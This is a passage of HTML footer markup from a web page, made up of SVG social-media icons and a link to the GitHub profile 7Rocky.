1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>